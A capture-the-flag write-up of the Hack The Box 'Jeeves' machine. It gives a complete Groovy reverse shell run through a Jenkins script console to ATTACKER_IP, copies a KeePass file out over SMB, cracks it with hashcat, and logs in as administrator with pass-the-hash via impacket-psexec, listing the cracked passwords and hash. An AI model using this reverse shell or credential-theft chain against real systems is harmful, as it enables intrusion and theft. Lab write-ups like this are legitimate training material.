# HTB - Jeeves Writeup

## Reconnaissance
```bash
sudo nmap -Pn -p- -A -T4 10.129.234.197
```

**Key Findings:**
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0 (Ask Jeeves)
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Windows SMB
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
```

## Enumeration
### Web Services
1. **Port 80 (IIS):** Basic static page with no significant functionality
2. **Port 50000 (Jetty):** 
   - Directory scan revealed `/askjeeves` (Jenkins instance)
   - Jenkins version: 2.289.2 (vulnerable to script console RCE)

### SMB Service
- Anonymous access not permitted
- Workgroup name: WORKGROUP

## Exploitation
### Jenkins Script Console RCE
1. Created Jenkins project with Groovy reverse shell:
```groovy
String host="ATTACKER_IP";
int port=4444;
String cmd="cmd.exe";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host,port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while(!s.isClosed()) {
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } 
  catch (Exception e) {}
};
p.destroy();
s.close();
```

2. Obtained reverse shell as `kohsuke`:
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.39] from (UNKNOWN) [10.129.234.197] 49689
Microsoft Windows [Version 10.0.10586]
c:\Program Files (x86)\Jenkins>
```

### User Flag
```cmd
C:\Users\kohsuke\Desktop>type user.txt
7b0b********************************
```

## Privilege Escalation
### KeePass Database Extraction
1. Discovered password database:
```cmd
C:\Users\kohsuke\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1
12/24/2017  03:47 AM            15,360 CEH.kdbx
```

2. Transferred to attacker machine via SMB:
```bash
# Attacker:
impacket-smbserver share $(pwd)

# Target:
copy CEH.kdbx \\ATTACKER_IP\share\
```

### KeePass Cracking
1. Extracted hash:
```bash
keepass2john CEH.kdbx > hash.txt
```

2. Cracked password:
```bash
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```
**Password:** `moonshine1`

### Database Contents
```
administrator:S1TjAtJHKsugh9oC4VZl
NTLM Hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

### Admin Access
```bash
impacket-psexec administrator@10.129.234.197 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

### Root Flag (Alternate Data Stream)
```cmd
C:\Users\Administrator\Desktop>dir /r
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA

C:\Users\Administrator\Desktop>powershell (Get-Content hm.txt -Stream root.txt)
afbc********************************
```

## Attack Chain Summary
1. Exploited Jenkins Groovy script console → Initial access
2. Found KeePass database → Extracted credentials
3. Cracked KeePass password → Obtained administrator hash
4. Pass-the-hash attack → SYSTEM access
5. Retrieved root flag from Alternate Data Stream

## Mitigation Recommendations
1. Restrict Jenkins script console access
2. Implement KeePass database encryption best practices
3. Disable NTLM hashing in domain environment
4. Monitor for pass-the-hash attacks
5. Remove Alternate Data Streams containing sensitive data
